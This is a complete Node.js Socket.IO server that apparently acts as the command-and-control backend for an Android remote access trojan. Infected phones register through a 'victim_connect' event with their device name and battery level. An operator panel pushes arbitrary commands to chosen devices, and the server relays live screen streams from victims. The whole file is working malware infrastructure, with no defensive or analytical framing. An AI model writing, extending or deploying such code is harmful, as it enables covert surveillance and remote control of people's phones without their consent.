const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" },
    transports: ['polling', 'websocket']
});

// Store devices
const devices = new Map();
const deviceInfo = new Map();

// Serve panel.html directly
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

// Socket events
io.on('connection', (socket) => {
    console.log('✅ Client connected:', socket.id);

    // APK registers
    socket.on('victim_connect', (data) => {
        console.log('📱 Device connected:', data.deviceId);
        devices.set(data.deviceId, socket.id);
        deviceInfo.set(data.deviceId, {
            deviceId: data.deviceId,
            deviceName: data.deviceName,
            battery: data.battery
        });
        broadcastDevices();
    });

    // Panel commands
    socket.on('panel_command', (data) => {
        const targetSocket = devices.get(data.targetId);
        if (targetSocket) {
            io.to(targetSocket).emit(data.type, data.data);
        }
    });

    // Screen stream
    socket.on('live_screen', (data) => {
        socket.broadcast.emit('live_screen_update', data);
    });

    // Heartbeat
    socket.on('heartbeat', (data) => {
        if (deviceInfo.has(data.deviceId)) {
            deviceInfo.get(data.deviceId).battery = data.battery;
            broadcastDevices();
        }
    });

    socket.on('disconnect', () => {
        for (let [id, sockId] of devices.entries()) {
            if (sockId === socket.id) {
                devices.delete(id);
                deviceInfo.delete(id);
                broadcastDevices();
                break;
            }
        }
    });
});

function broadcastDevices() {
    const list = Array.from(deviceInfo.values());
    io.emit('devices_list', list);
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
